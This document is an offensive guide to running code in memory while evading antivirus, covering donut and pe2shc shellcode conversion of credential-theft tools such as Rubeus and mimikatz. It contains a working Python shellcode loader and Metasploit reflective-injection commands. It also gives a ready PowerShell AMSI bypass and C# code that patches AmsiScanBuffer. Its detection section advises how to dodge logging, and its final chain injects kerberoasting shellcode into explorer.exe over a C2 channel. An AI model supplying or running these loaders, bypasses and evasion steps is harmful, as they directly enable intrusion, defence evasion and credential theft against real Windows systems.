# In-Memory Execution and .NET Shellcode Guide

> Use donut for .NET assembly shellcode generation, pe2shc for PE-to-shellcode conversion, reflective DLL injection for in-memory module loading, and AMSI bypass techniques to defeat runtime script scanning. This guide covers the theory and practice of executing code without touching disk.

## Introduction

Disk-based detection is the primary mechanism for most antivirus products: they scan files as they are written to disk, before execution, and during periodic full-system scans. In-memory execution bypasses this entirely by loading code directly into process memory without creating or modifying files on the filesystem. This approach is significantly harder for AV/EDR to detect because it operates below the file-scanning layer.

This guide covers four complementary in-memory execution techniques: donut for converting .NET assemblies into position-independent shellcode, pe2shc for converting PE executables into shellcode, reflective DLL injection for loading DLLs without the Windows loader, and AMSI bypass for defeating the Anti-Malware Scan Interface that protects PowerShell and .NET script execution.

---

## 1. Donut - .NET Assembly Shellcode Generator

### How Donut Works

Donut converts .NET assemblies (EXE/DLL) into x86 or x64 position-independent shellcode that can be loaded via any shellcode injection mechanism. The generated shellcode contains a donut loader stub that:

1. Resolves the CLR (Common Language Runtime) hosting interfaces without using mscoree.dll imports.
2. Loads the .NET assembly from an embedded byte array in memory.
3. Invokes the assembly's entry point or a specified class/method with optional parameters.
4. Includes optional bypasses for AMSI (Anti-Malware Scan Interface) and WLDP/WDAC (Windows Defender Application Control).

### Basic Usage

```bash
# Convert a .NET assembly with default settings
donut -i Rubeus.exe -o rubeus.bin

# Convert with command-line parameters
donut -i Seatbelt.exe -p "-group=all" -o seatbelt.bin

# Convert for x64 architecture with AMSI bypass
donut -i Rubeus.exe -a 2 -b 1 -o rubeus_amsi_bypass.bin

# Convert with both AMSI and WDAC bypass
donut -i Rubeus.exe -b 3 -o rubeus_full_bypass.bin
```

### Architecture Considerations

```
Architecture Flag | Description      | Use Case
-a 1              | x86 (32-bit)     | Target process is 32-bit
-a 2              | x64 (64-bit)     | Target process is 64-bit (most common)
-a 3              | x86 + x64        | Combined, auto-detects at runtime
```

Always match the donut output architecture to the target process architecture. Injecting x64 shellcode into an x86 process (or vice versa) will crash the process.

### Delivery Mechanisms for Donut Shellcode

Once generated, donut shellcode can be delivered through multiple injection mechanisms:

1. **Local injection**: Allocate memory in the current process (VirtualAlloc), copy shellcode, create a thread (CreateThread). Fast but runs in the injector's process context.
2. **Remote injection**: Allocate memory in a target process (VirtualAllocEx), write shellcode (WriteProcessMemory), create a remote thread (CreateRemoteThread). Provides process context blending.
3. **Process hollowing**: Create a suspended process, unmap its memory, write shellcode in its place, resume execution. Creates a legitimate process appearance.
4. **Thread hijacking**: Suspend an existing thread in the target process, redirect its instruction pointer to the shellcode, and resume. Avoids creating new threads that EDR monitors.

### Common .NET Tools for Donut Conversion

```
Tool          | Purpose                        | Common Parameters
Rubeus        | Kerberos attacks               | "kerberoast", "asreproast", "dump"
Seatbelt      | Security auditing              | "-group=all", "-group=system"
SharpHound    | Active Directory enumeration   | "--collectionmethod all"
Certify       | Certificate abuse              | "find /vulnerable"
SharpUp       | Privilege escalation checks    | "audit"
SafetyKatz    | Credential dumping             | (no parameters needed)
```

---

## 2. pe2shc - PE to Shellcode Conversion

### How pe2shc Works

pe2shc converts standard PE executables into position-independent shellcode by:

1. Extracting the PE's code sections and data.
2. Adding a loader stub that resolves base addresses and relocations.
3. Producing a flat binary that can be executed from any memory location.

Unlike donut (which targets .NET specifically), pe2shc works with native PE executables including those built with C/C++, Go, and Rust.

### Usage

```bash
# Convert PE to shellcode
pe2shc mimikatz.exe mimikatz.bin

# Verify output
pe2shc reports:
  [+] PE to shellcode conversion successful
  [+] Entry point: 0xADDRESS
  [+] Image base: 0xADDRESS
  [+] Shellcode size: SIZE bytes
```

### Limitations and Considerations

- **Large binaries**: Converting large tools (mimikatz is ~1.5MB) produces equally large shellcode, which may trigger size-based heuristics or fail to inject into processes with limited memory.
- **Dependencies**: PE files that depend on specific DLLs not present in the target process will fail. pe2shc does not bundle dependencies.
- **Relocations**: ASLR-aware executables with relocation tables convert more reliably than those without.
- **Anti-tamper**: Some tools include integrity checks that detect when they have been converted to shellcode format.

### Integration with Injection Frameworks

```python
# Python loader for pe2shc output
import ctypes
import sys

def load_shellcode(shellcode_path):
    with open(shellcode_path, "rb") as f:
        sc = f.read()

    # Allocate executable memory
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        None, len(sc), 0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )

    # Copy shellcode to allocated memory
    ctypes.windll.kernel32.RtlMoveMemory(ptr, sc, len(sc))

    # Execute shellcode in a new thread
    thread = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
    ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)

if __name__ == "__main__":
    load_shellcode(sys.argv[1])
```

---

## 3. Reflective DLL Injection

### Concept

Reflective DLL injection loads a DLL into a process without using the standard Windows API (LoadLibrary). The DLL itself contains a reflective loader function that handles its own loading: resolving imports, processing relocations, and calling DllMain. Because the Windows loader is bypassed, the DLL never appears in the module list (EnumerateProcessModules) and is invisible to tools that rely on the loader's module database.

### Implementation Requirements

A reflective DLL requires:

1. **Reflective loader function**: A position-independent function that serves as the DLL's entry point when injected as shellcode.
2. **Import resolution**: The loader must resolve all API functions the DLL needs by walking the PEB (Process Environment Block) to find kernel32.dll and then using GetProcAddress for other modules.
3. **Relocation processing**: The loader must fix up address references based on the actual memory address where the DLL is loaded.
4. **DllMain invocation**: After loading is complete, the loader calls DllMain with DLL_PROCESS_ATTACH.

### Metasploit Reflective DLL Injection

```bash
# Metasploit already uses reflective loading for meterpreter
# The staging process is itself a form of reflective DLL injection:
# 1. Stage 1 (stager): connects to handler, downloads stage 2
# 2. Stage 2 (meterpreter DLL): reflectively loads in memory
# 3. No DLL file is written to disk

# Custom reflective DLL usage in Metasploit
use exploit/windows/local/reflective_dll_inject
set SESSION 1
set DLL_PATH /path/to/reflective.dll
set PID 1234
exploit
```

### Writing a Reflective Loader (Conceptual)

```c
// Simplified reflective loader pseudocode
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // 1. Get own base address (using return address from call instruction)
    ULONG_PTR base = (ULONG_PTR)ReflectiveLoader;
    while (*(WORD*)base != IMAGE_DOS_SIGNATURE) base--;

    // 2. Parse PE headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    // 3. Resolve kernel32.dll via PEB
    HMODULE kernel32 = ResolveKernel32();

    // 4. Get required functions: VirtualAlloc, GetProcAddress, LoadLibraryA
    fnVirtualAlloc VirtualAlloc = ResolveFunction(kernel32, "VirtualAlloc");

    // 5. Allocate memory and copy sections
    LPVOID mem = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, ...);
    CopySections(base, mem);

    // 6. Process relocations
    ProcessRelocations(mem, nt);

    // 7. Resolve imports
    ResolveImports(mem, nt);

    // 8. Call DllMain
    DllMain((HMODULE)mem, DLL_PROCESS_ATTACH, lpParameter);

    return 0;
}
```

---

## 4. AMSI Bypass Techniques

### What AMSI Does

The Anti-Malware Scan Interface (AMSI) is a Windows feature that allows AV products to scan content before it is executed. AMSI integrates with PowerShell, VBScript, JScript, .NET assembly loading, and other scripting engines. When a script is executed, the scripting engine passes the content to AMSI, which forwards it to registered AV providers for scanning. If any provider flags the content as malicious, execution is blocked.

### AMSI Bypass via amsiInitFailed

The simplest AMSI bypass sets the internal `amsiInitFailed` flag in the .NET runtime, which causes all subsequent AMSI scans to return "clean":

```powershell
# PowerShell AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

This works because the AMSI utility class checks this flag before performing scans. When set to true, the scan function returns immediately without sending content to the AV provider. This technique is widely signatured and may be detected by EDR products monitoring PowerShell command-line content.

### AMSI Bypass via AmsiScanBuffer Patching

A more robust approach patches the `AmsiScanBuffer` function in amsi.dll to always return `AMSI_RESULT_CLEAN`:

```csharp
// C# AMSI bypass via function patching
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch()
    {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        // Patch: mov eax, 0x80070057 (E_INVALIDARG -> triggers early return with clean result)
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
```

### AMSI Bypass Detection and Countermeasures

Modern EDR products detect AMSI bypass attempts through several mechanisms:

1. **Command-line logging**: PowerShell script block logging (Event ID 4104) captures the bypass commands before AMSI is patched.
2. **AMSI integrity checks**: Some AV products verify that AmsiScanBuffer has not been patched by checking function prologue bytes.
3. **Memory protection monitoring**: Changes to amsi.dll memory page protections (VirtualProtect with PAGE_EXECUTE_READWRITE) are flagged by EDR.

To reduce detection: patch AMSI early in the execution chain before script block logging captures the bypass command; use indirect patching through function pointer manipulation rather than direct VirtualProtect; and combine AMSI bypass with ETW patching to disable telemetry before the bypass is logged.

---

## 5. Combining Techniques

The most effective in-memory execution chains combine multiple techniques:

1. **AMSI bypass** (patch AmsiScanBuffer) to disable script scanning.
2. **Donut shellcode generation** to convert the .NET tool into position-independent code.
3. **Remote process injection** to execute the shellcode in a legitimate process context.
4. **ETW patching** (optional) to disable telemetry before execution.

```bash
# Step 1: Convert tool to shellcode
donut -i Rubeus.exe -p "kerberoast" -b 3 -o rubeus.bin

# Step 2: Create a loader that:
#   a) Patches AMSI
#   b) Injects rubeus.bin into explorer.exe (or another legitimate process)
#   c) Routes output back through the C2 channel

# Step 3: Execute via C2 agent
# The loader runs entirely in memory without touching disk
```

---

## References

- **Donut GitHub Repository**: https://github.com/TheWover/donut
- **pe2shc GitHub Repository**: https://github.com/hasherezade/pe_to_shellcode
- **Reflective DLL Injection (Stephen Fewer)**: https://github.com/stephenfewer/ReflectiveDLLInjection
- **AMSI Documentation (Microsoft)**: https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
- **HackTricks - AMSI Bypass**: https://book.hacktricks.xyz/windows-hardening/windows-amsi-bypass
- **SharpC2 In-Memory Execution**: https://github.com/SharpC2/SharpC2
